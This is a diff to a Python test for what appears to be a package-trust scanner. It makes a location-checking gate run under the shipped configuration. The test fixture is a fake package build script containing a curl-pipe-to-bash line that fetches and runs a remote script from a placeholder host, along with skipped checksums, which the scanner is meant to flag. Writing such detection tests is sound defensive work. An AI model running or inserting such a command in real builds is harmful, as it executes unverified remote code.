@@ -953,7 +953,16 @@ def gate_content_findings_carry_a_location() -> Gate:
     cannot (maintainer, temporal, corpus, graph) must say so explicitly:
     a missing location must not be indistinguishable from a rule that
     forgot to set one.
+
+    Runs under ``shipped_config()`` like
+    :func:`gate_declared_findings_fire_under_shipped_config`: the resolved
+    rules R001/R002/R003/R012/R039-R045/R055-R057 only carry a location
+    through the shipped ``match_target = "resolved"`` path, and a local
+    rules.toml that overrides them to ``raw_line`` must not make this gate
+    pass locally while CI fails.
     """
+    from calibration_gates import shipped_config
+
     from trustsight.analysis import scan_diff
     from trustsight.findings import NON_CONTENT_RULES
 
@@ -962,12 +971,14 @@ def gate_content_findings_carry_a_location() -> Gate:
         "+build() {\n"
         "+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n"
         "+}\n"
-        "+source=(\"https://example.invalid/a.tar.gz\")\n"
+        '+source=("https://example.invalid/a.tar.gz")\n'
         "+sha256sums=('SKIP')\n"
     )
-    fact = scan_diff(header + body, package_name="demo")
 
     problems = []
+    with shipped_config():
+        fact = scan_diff(header + body, package_name="demo")
+
     for entry in fact.score_breakdown:
         rid = entry.rule_id
         if rid.startswith("P") and rid[1:].isdigit():
